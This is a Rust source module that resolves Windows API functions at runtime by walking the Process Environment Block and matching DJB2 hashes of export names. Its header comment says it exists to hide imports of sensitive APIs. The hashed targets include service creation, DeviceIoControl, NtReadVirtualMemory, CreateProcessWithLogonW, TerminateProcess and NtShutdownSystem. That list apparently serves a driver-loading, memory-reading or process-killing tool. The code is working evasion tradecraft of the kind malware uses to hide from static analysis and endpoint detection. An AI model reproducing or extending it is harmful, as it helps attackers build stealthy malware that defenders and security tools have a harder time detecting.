//! Dynamic API resolution via PEB walking and DJB2 hash-based export lookup.
//!
//! Avoids static imports of sensitive APIs by resolving them at runtime
//! through Process Environment Block traversal and PE export table parsing.

use std::ffi::c_void;

/// DJB2 hash function for ASCII strings (case-insensitive)
pub fn djb2_hash(s: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    for &c in s {
        let c = if c >= b'A' && c <= b'Z' { c + 32 } else { c };
        hash = hash.wrapping_mul(33).wrapping_add(c as u32);
    }
    hash
}

/// DJB2 hash function for wide (UTF-16) strings (case-insensitive)
pub fn djb2_hash_wide(s: &[u16]) -> u32 {
    let mut hash: u32 = 5381;
    for &c in s {
        let c = if c >= b'A' as u16 && c <= b'Z' as u16 {
            c + 32
        } else {
            c
        };
        hash = hash.wrapping_mul(33).wrapping_add(c as u32);
    }
    hash
}

// Pre-computed DJB2 hashes for module names (lowercase)
pub const HASH_KERNEL32: u32 = djb2_hash_const(b"kernel32.dll");
pub const HASH_NTDLL: u32 = djb2_hash_const(b"ntdll.dll");
pub const HASH_ADVAPI32: u32 = djb2_hash_const(b"advapi32.dll");

// Pre-computed DJB2 hashes for function names
pub const HASH_OPEN_SC_MANAGER_W: u32 = djb2_hash_const(b"OpenSCManagerW");
pub const HASH_CREATE_SERVICE_W: u32 = djb2_hash_const(b"CreateServiceW");
pub const HASH_START_SERVICE_W: u32 = djb2_hash_const(b"StartServiceW");
pub const HASH_OPEN_SERVICE_W: u32 = djb2_hash_const(b"OpenServiceW");
pub const HASH_CONTROL_SERVICE: u32 = djb2_hash_const(b"ControlService");
pub const HASH_DELETE_SERVICE: u32 = djb2_hash_const(b"DeleteService");
pub const HASH_CLOSE_SERVICE_HANDLE: u32 = djb2_hash_const(b"CloseServiceHandle");
pub const HASH_CREATE_FILE_W: u32 = djb2_hash_const(b"CreateFileW");
pub const HASH_DEVICE_IO_CONTROL: u32 = djb2_hash_const(b"DeviceIoControl");
pub const HASH_CLOSE_HANDLE: u32 = djb2_hash_const(b"CloseHandle");
pub const HASH_GET_FILE_SIZE: u32 = djb2_hash_const(b"GetFileSize");
pub const HASH_WRITE_FILE: u32 = djb2_hash_const(b"WriteFile");
pub const HASH_VIRTUAL_PROTECT: u32 = djb2_hash_const(b"VirtualProtect");
pub const HASH_CREATE_PROCESS_WITH_LOGON_W: u32 = djb2_hash_const(b"CreateProcessWithLogonW");
pub const HASH_GET_PROCESS_ID: u32 = djb2_hash_const(b"GetProcessId");
pub const HASH_DUPLICATE_HANDLE: u32 = djb2_hash_const(b"DuplicateHandle");
pub const HASH_TERMINATE_PROCESS: u32 = djb2_hash_const(b"TerminateProcess");
pub const HASH_NT_READ_VIRTUAL_MEMORY: u32 = djb2_hash_const(b"NtReadVirtualMemory");
pub const HASH_NT_QUERY_VIRTUAL_MEMORY: u32 = djb2_hash_const(b"NtQueryVirtualMemory");
pub const HASH_NT_DEVICE_IO_CONTROL_FILE: u32 = djb2_hash_const(b"NtDeviceIoControlFile");
pub const HASH_NT_SHUTDOWN_SYSTEM: u32 = djb2_hash_const(b"NtShutdownSystem");

/// Compile-time DJB2 hash computation
pub const fn djb2_hash_const(s: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    let mut i = 0;
    while i < s.len() {
        let c = if s[i] >= b'A' && s[i] <= b'Z' {
            s[i] + 32
        } else {
            s[i]
        };
        hash = hash.wrapping_mul(33).wrapping_add(c as u32);
        i += 1;
    }
    hash
}

/// Resolved API function pointers
pub struct ApiResolver {
    pub kernel32_base: *mut u8,
    pub ntdll_base: *mut u8,
    pub advapi32_base: *mut u8,
}

impl ApiResolver {
    /// Initialize the resolver by walking the PEB to find module bases
    pub fn init() -> Result<Self, String> {
        unsafe {
            let peb = get_peb();
            if peb.is_null() {
                return Err("Failed to get PEB".into());
            }

            let ldr = (*(peb as *const PEB64)).ldr;
            if ldr.is_null() {
                return Err("PEB.Ldr is null".into());
            }

            let list_head = &(*ldr).in_memory_order_module_list as *const LIST_ENTRY;
            let mut current = (*list_head).flink;

            let mut kernel32_base: *mut u8 = std::ptr::null_mut();
            let mut ntdll_base: *mut u8 = std::ptr::null_mut();
            let mut advapi32_base: *mut u8 = std::ptr::null_mut();

            while current != list_head as *mut _ {
                let entry = (current as *const u8).sub(std::mem::size_of::<LIST_ENTRY>())
                    as *const LDR_DATA_TABLE_ENTRY;
                let name = &(*entry).base_dll_name;

                if name.length > 0 && !name.buffer.is_null() {
                    let name_slice =
                        std::slice::from_raw_parts(name.buffer, (name.length / 2) as usize);
                    let hash = djb2_hash_wide(name_slice);

                    if hash == HASH_KERNEL32 {
                        kernel32_base = (*entry).dll_base;
                    } else if hash == HASH_NTDLL {
                        ntdll_base = (*entry).dll_base;
                    } else if hash == HASH_ADVAPI32 {
                        advapi32_base = (*entry).dll_base;
                    }
                }

                current = (*current).flink;

                // Found all three
                if !kernel32_base.is_null() && !ntdll_base.is_null() && !advapi32_base.is_null() {
                    break;
                }
            }

            if kernel32_base.is_null() {
                return Err("kernel32.dll not found via PEB".into());
            }
            if ntdll_base.is_null() {
                return Err("ntdll.dll not found via PEB".into());
            }

            Ok(ApiResolver {
                kernel32_base,
                ntdll_base,
                advapi32_base,
            })
        }
    }

    /// Resolve a function from a module by DJB2 hash of function name
    pub fn resolve(&self, module_base: *mut u8, func_hash: u32) -> Option<*mut c_void> {
        if module_base.is_null() {
            return None;
        }
        unsafe { get_export_by_hash(module_base, func_hash) }
    }

    /// Resolve from kernel32
    pub fn k32(&self, func_hash: u32) -> Option<*mut c_void> {
        self.resolve(self.kernel32_base, func_hash)
    }

    /// Resolve from ntdll
    pub fn ntdll(&self, func_hash: u32) -> Option<*mut c_void> {
        self.resolve(self.ntdll_base, func_hash)
    }

    /// Resolve from advapi32
    pub fn advapi32(&self, func_hash: u32) -> Option<*mut c_void> {
        self.resolve(self.advapi32_base, func_hash)
    }
}

// --- PEB structures ---

#[repr(C)]
struct PEB64 {
    reserved1: [u8; 2],
    being_debugged: u8,
    reserved2: u8,
    reserved3: [*mut u8; 2],
    ldr: *mut PEB_LDR_DATA,
}

#[repr(C)]
struct PEB_LDR_DATA {
    reserved1: [u8; 8],
    reserved2: [*mut u8; 3],
    in_memory_order_module_list: LIST_ENTRY,
}

#[repr(C)]
struct LIST_ENTRY {
    flink: *mut LIST_ENTRY,
    blink: *mut LIST_ENTRY,
}

#[repr(C)]
struct LDR_DATA_TABLE_ENTRY {
    in_load_order_links: LIST_ENTRY,
    in_memory_order_links: LIST_ENTRY,
    in_initialization_order_links: LIST_ENTRY,
    dll_base: *mut u8,
    entry_point: *mut u8,
    size_of_image: u32,
    full_dll_name: UNICODE_STRING,
    base_dll_name: UNICODE_STRING,
}

#[repr(C)]
struct UNICODE_STRING {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

// --- PE structures ---

#[repr(C)]
struct IMAGE_DOS_HEADER {
    e_magic: u16,
    _pad: [u8; 58],
    e_lfanew: i32,
}

#[repr(C)]
struct IMAGE_NT_HEADERS64 {
    signature: u32,
    file_header: IMAGE_FILE_HEADER,
    optional_header: IMAGE_OPTIONAL_HEADER64,
}

#[repr(C)]
struct IMAGE_FILE_HEADER {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

#[repr(C)]
struct IMAGE_OPTIONAL_HEADER64 {
    magic: u16,
    _pad: [u8; 110], // PE32+ (64-bit): 110 bytes between Magic and DataDirectory
    data_directory: [IMAGE_DATA_DIRECTORY; 16],
}

#[repr(C)]
#[derive(Clone, Copy)]
struct IMAGE_DATA_DIRECTORY {
    virtual_address: u32,
    size: u32,
}

#[repr(C)]
struct IMAGE_EXPORT_DIRECTORY {
    characteristics: u32,
    time_date_stamp: u32,
    major_version: u16,
    minor_version: u16,
    name: u32,
    base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinals: u32,
}

/// Get PEB pointer via GS register (x64)
unsafe fn get_peb() -> *mut u8 {
    let peb: *mut u8;
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    peb
}

/// Resolve an export from a PE module by DJB2 hash
unsafe fn get_export_by_hash(module_base: *mut u8, func_hash: u32) -> Option<*mut c_void> {
    let dos_header = module_base as *const IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != 0x5A4D {
        return None; // Not a valid PE
    }

    let nt_headers = module_base.add((*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    if (*nt_headers).signature != 0x00004550 {
        return None; // Invalid NT signature
    }

    let export_rva = (*nt_headers).optional_header.data_directory[0].virtual_address;
    let export_size = (*nt_headers).optional_header.data_directory[0].size;
    if export_rva == 0 {
        return None;
    }

    let export_dir = module_base.add(export_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;
    let names = module_base.add((*export_dir).address_of_names as usize) as *const u32;
    let ordinals = module_base.add((*export_dir).address_of_name_ordinals as usize) as *const u16;
    let functions = module_base.add((*export_dir).address_of_functions as usize) as *const u32;

    for i in 0..(*export_dir).number_of_names {
        let name_rva = *names.add(i as usize);
        let name_ptr = module_base.add(name_rva as usize);

        // Read null-terminated ASCII name
        let mut len = 0usize;
        while *name_ptr.add(len) != 0 {
            len += 1;
            if len > 256 {
                break;
            }
        }
        let name_bytes = std::slice::from_raw_parts(name_ptr, len);
        let hash = djb2_hash(name_bytes);

        if hash == func_hash {
            let ordinal = *ordinals.add(i as usize) as usize;
            let func_rva = *functions.add(ordinal);

            // Check for forwarded export (RVA within export directory)
            if func_rva >= export_rva && func_rva < export_rva + export_size {
                // Forwarded export — skip for now
                return None;
            }

            return Some(module_base.add(func_rva as usize) as *mut c_void);
        }
    }
    None
}
